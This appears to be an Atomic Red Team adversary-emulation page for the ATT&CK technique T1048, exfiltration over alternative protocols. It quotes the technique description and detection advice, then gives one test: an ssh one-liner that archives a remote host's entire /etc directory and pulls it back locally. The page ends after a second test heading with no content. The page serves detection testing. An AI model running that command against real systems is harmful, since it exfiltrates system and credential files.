# T1048 - Exfiltration Over Alternative Protocol
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1048)
<blockquote>Data exfiltration is performed with a different protocol from the main command and control protocol or channel. The data is likely to be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or some other network protocol. Different channels could include Internet Web services such as cloud storage.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: User interface, Process monitoring, Process use of network, Packet capture, Netflow/Enclave netflow, Network protocol analysis

Requires Network: Yes</blockquote>

## Atomic Test #1 - Exfiltration Over Alternative Protocol - SSH
Input a domain and test Exfiltration over SSH

Remote to Local

**Supported Platforms:** macOS, CentOS, Ubuntu, Linux


#### Inputs
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| domain | target SSH domain | url | target.example.com|
| user_name | username for domain | string | atomic|
| passowrd | password for user | string | atomic|

#### Run it with `sh`!
```
ssh ${domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```
<br/>
<br/>

## Atomic Test #2 - Exfiltration Over Alternative Protocol - SSH
